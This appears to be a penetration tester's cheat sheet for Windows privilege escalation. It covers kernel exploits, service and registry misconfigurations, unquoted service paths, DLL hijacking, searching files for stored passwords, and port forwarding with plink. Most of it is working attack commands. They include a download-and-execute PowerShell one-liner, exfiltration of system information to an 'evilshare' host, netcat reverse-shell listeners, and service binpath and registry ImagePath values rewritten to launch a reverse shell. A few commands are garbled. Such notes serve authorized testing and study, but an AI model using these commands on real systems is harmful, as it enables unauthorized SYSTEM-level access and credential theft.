# Kernal Exploits
```powershell
## Kernal exploit are very unstable. Should only use as a last resort
## Use Windows Exploit Suggester
https://github.com/bitsadmin/wesng

## Precompiled kernal exploits
https://github.com/SecWiki/windows-kernel-exploits

## Enumerate missing KBs and suggest exploits
https://github.com/rasta-mouse/Watson

## On Victim host, cat sysinfo to txt file
systeminfo > \\0.0.0.0\evilshare\systeminfo.txt

## Run watson against systeminfo.txt
python wes.py /evilshare/systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more

## Find cve exploit, transfer a .exe rev shell to victim and start nc on attacker host
nc -nvlp 8989

## Run compiled binary on victim host to execute revshell
.\cve-8120-x64.exe C:\Users\Public\rev.exe
## Should get SYSTEM on nc listener if done correctly

```

# Service Exploits
```powershell
## Useful service cmds
## Query the config of a service
sc.exe qc <name>
## Query the current status of a service
sc.exe query <name>
##Modify a config option of a service
sc.exe config <name> <option>= <value>
##  Start/stop a service
net start/stop <name>
```

### Service Misconfigurations
### Insecure Misconfig Permissions
```powershell
## If user has permissions to change the config of a service white run with SYSTEM priv, we can change the executable to one of ours.
## If you cannot start/stop the service, you may not work.

## Use can use winpeas to enum services information
.\winpeasany.exe quiet servicesinfo
## Verify winpeas info w/ accesschk Look for service change config,start/stop permissions.
.\accesschk.exe /accepteula -uwcqv user <servicename>
## Query the service to see its config
sc qc <name>
## if u see 'Service_start_name: localsystem' = SYSTEM 
## Stop the service
net stop <servicename>
## Change the services binary path to your reverseshell.exe
sc config <servicename> binpath= "\"C:\User\Public\rev.exe\""
## Start yo' listener on local host
sudo nc -nvlp 8989
## start service 
net start <servicename>
```

### Unquoted Service Path
```powershell
##Executables in Windows can be run w/o using thie extension using their extension (e.g. "whoami.exe" can be exectuable by type just "whoami").
## Some executables take more than 1 argument, separated by spaces. E.g cmd.exe arg1 arg2 arg3.
## This type of buzz leads to ambiguity when using abslute paths that are unquoted and contain spaces.

## Example of unquoted path: C:\Program Files\Clients App\program.exe
## This us, this runs program.exe. To Windows, C:\Program could be the executable with the two arguments "Files\Clients" and "App\program.exe".
## Windows resolves this ambiguity by checking each of the possibilities.
## If u can write to a location Windows check before the actual executable u can trick the service into executing it instead. lol
```

```powershell
## Use winpeas to check or powerup if you have powershell.
.\winpeasany.exe quiet servicesinfo
OR
powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘http://0.0.0.0/PowerUp.ps1’);Invoke-AllChecks”

## verify u have start/stop access
.\accesschk.exe /accepteula -ucqv <service>
## Check write permissions on each directory in the binary PATH
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
## Copy ur revshell.exe to on the binary paths you have access to (builtin\users)
copy revshell.exe .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\rev.exe"
## Start nc on local host and then start the service.
```

## Weak Registry Permissions
```powershell
## Windows registry stores entries for each service.
## Since registry entries can have ACLs, if the ACl is misconfigured it could modify a services configuration even if we cannot modify the service directly.

## In winpeas output, you want to check under  the 'Looking if you can modify any service registry' results

powershell -exec bypass

Get-Acl <reg-path-from-winpeas> | Format-List

.\accesschk.exe /accepteula -uvwqk <reg-path-from-winpeas>
##check to see if you can restart service
.\accesschk.exe /accepteula -ucqv -user regsvc

reg query <reg-path-from-winpeas>
## Check imagepath from above cmd. see if object runs as local system. If yes, overwrite the imagepath to your rev shell.
 reg add <reg-path-from-winpeas> /v ImagePath /t REG_EXPAND_SZ /d C:\User\Public\rev.exe /f

## Start your listener and then start the service.
```

## Insecure Service Excutables
```powershell
## If the og service executable is modifiable by our user, we can replace it with our rev shell exe. Create a backup if exploiting in IRL.
## Check Winpeas results for Service Info.
```

## DLL Hijacking
```powershell
## DLL = Dynamic-link library. A service will try to load parts of the program from a library clled DLL files. Whatever functionality the DLL provides will be executed with the same privileges as the service that loaded it. 
## If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

## A more common misconfig is when a DLL is missing from the system, and our user has write permissions to a directory within the PATH that windows is searching for the DLL in. This process is very manual.

## If you find a DLL missing PATH, you can use msfvenom to create a rev shell DLL.
```







































































#### DLL Hijacking
```powershell
ps
search -f Vulnerable.exe
download Vulnerable.exe
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
```
#### Stored Credentials
```powershell
dir c:\*vnc.ini /s /b /c
dir c:\*ultravnc.ini /s /b /c
dir c:\ /s /b /c | fin dstr /si *vnc.ini
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
```

#### Port Forwarding
```powershell
Upload plink.exe to target.
Start SSH on your attacking machine.
plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
```
```